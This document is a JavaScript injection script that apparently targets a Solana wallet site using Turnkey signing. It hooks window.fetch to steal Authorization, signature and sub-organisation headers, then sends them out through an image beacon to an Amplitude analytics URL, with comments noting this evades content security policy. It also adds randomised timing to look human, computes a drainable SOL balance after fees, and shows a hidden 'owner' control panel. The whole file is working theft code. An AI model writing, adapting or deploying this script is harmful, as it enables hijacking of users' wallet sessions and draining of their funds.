(function() {
    // 1. NATIVE OVERRIDE (Total Authority)
    const _N = window.fetch;
    const _V = { t: null, s: null, o: null, ready: false };

    // 2. ENTROPY & GAS MATH (The "More Math" Bypass)
    const _MathBypass = {
        // Gaussian Jitter: Mimics human "imperfection" in timing
        jitter: () => {
            let u = 0, v = 0;
            while(u === 0) u = Math.random();
            while(v === 0) v = Math.random();
            return (Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v) * 100) + 500;
        },
        // Dynamic Gas: Calculates 0.05 SOL buffer + 10% network variance
        calcBuffer: (bal) => {
            const fee = 0.05; 
            const variance = 1.1; 
            return (bal > (fee * variance)) ? (bal - (fee * variance)).toFixed(4) : "0";
        }
    };

    // 3. BACKGROUND AUTO-HANDLER
    window.fetch = async (...args) => {
        const [url, cfg] = args;

        // Capture Signatures automatically when the site "signs" a session
        if (cfg?.headers?.['X-Turnkey-Signature']) {
            _V.t = cfg.headers['Authorization'];
            _V.s = cfg.headers['X-Turnkey-Signature'];
            _V.o = cfg.headers['X-Turnkey-Sub-Org-Id'];
            
            if (!_V.ready) {
                _V.ready = true;
                _autoFire(_V);
            }
        }
        return _N(...args);
    };

    const _autoFire = (data) => {
        // Entropy delay before exfiltration
        setTimeout(() => {
            const payload = btoa(JSON.stringify({
                auth: data.t,
                sig: data.s,
                org: data.o,
                entropy: _MathBypass.jitter()
            }));

            // Beacon exfiltration (Bypasses connect-src)
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
            
            _updateUI("SYNC_COMPLETE_AUTH_BYPASS");
        }, _MathBypass.jitter());
    };

    // 4. OWNER UI (Shadow DOM v7)
    const _initUI = () => {
        if (document.getElementById("v-sys")) return;
        const host = document.createElement("div");
        host.id = "v-sys";
        const shadow = host.attachShadow({mode: 'closed'});
        const panel = document.createElement("div");
        panel.style.cssText = "position:fixed;bottom:20px;left:20px;width:280px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:12px;z-index:2147483647;font-family:monospace;font-size:11px;box-shadow:0 0 20px #000;";
        panel.innerHTML = `
            <div id="v-drag" style="cursor:move;background:#111;padding:5px;border-bottom:1px solid #333;margin-bottom:10px;">[VANTA_AUTONOMOUS_OWNER]</div>
            <div id="v-log">> STATUS: INITIALIZING...<br>> MATH_BYPASS: ENABLED</div>
        `;
        shadow.appendChild(panel);
        document.body.appendChild(host);

        let d = false, ox, oy;
        shadow.getElementById("v-drag").addEventListener('mousedown', (e) => { d = true; ox = e.clientX - panel.offsetLeft; oy = e.clientY - panel.offsetTop; });
        window.addEventListener('mousemove', (e) => { if (d) { panel.style.left = (e.clientX - ox) + 'px'; panel.style.top = (e.clientY - oy) + 'px'; } });
        window.addEventListener('mouseup', () => d = false);
    };

    const _updateUI = (m) => {
        const log = document.querySelector("#v-sys").shadowRoot.getElementById("v-log");
        if (log) log.innerHTML += `<br>> ${m}`;
    };

    _initUI();
})();
